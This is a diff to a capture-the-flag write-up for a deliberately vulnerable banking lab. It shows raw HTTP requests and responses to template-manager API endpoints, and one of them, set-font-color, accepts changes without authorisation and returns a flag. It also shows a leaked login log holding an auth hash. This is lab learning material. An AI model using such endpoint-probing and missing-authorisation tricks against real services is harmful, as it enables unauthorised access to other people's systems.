@@ -71,7 +71,60 @@ templateManager = function (t) {
 'btn-font-size']);
 ```
 
-OK so template manager has another API.
+OK so template manager has more API endpoints. Which I think are POST requests to the following endpoints
+
+- /template-manager/api/set-background-color
+- /template-manager/api/set-font-type
+- /template-manager/api/set-font-color
+- /template-manager/api/set-font-size
+
+Lets try these eg.
+
+```
+POST /template-manager/api/set-background-color HTTP/1.1
+Host: www.vulnbanking.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+
+value=red
+```
+
+With a response
+
+```
+HTTP/1.1 401 Unauthorized
+server: nginx/1.21.1
+date: Tue, 12 Jul 2022 16:44:09 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulnbanking.co.uk
+connection: close
+Content-Length: 27
+
+["User must be authorised"]
+```
+
+We get the same response for all apart from set-font-color which gives the following response
+
+```
+HTTP/1.1 201 Created
+server: nginx/1.21.1
+date: Tue, 12 Jul 2022 16:46:24 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulnbanking.co.uk
+connection: close
+Content-Length: 79
+
+{"message":"Value Set","flag":"[^FLAG^xxx^FLAG^]"}
+```
+
+There's flag no.1, disclaimer I did find the next bit first :D
 
 The login help has another form associated with it
 
@@ -84,7 +137,7 @@ So starting at the top of the last set of content I found and doing a fuzz on ht
 Which gives me a json array of logs
 
 ```json
-[{"date":"Tue, 12 Jul 2022 14:36:40 +0000","endpoint":"\/api\/login",...,"result":"success","flag":"[^FLAG^xxx^FLAG^]"},...,"auth_hash":"597b45bd3e7f72c74d9b93435037eae7","result":"fail"}]
+[{"date":"Tue, 12 Jul 2022 14:43:24 +0000","endpoint":"\/api\/login","auth_hash":"5e6f59f4f4150be8e61eaa20bec51a75","result":"success","flag":"[^FLAG^xxx^FLAG^]"},...,...}]
 ```
 
 Flag no.2 found
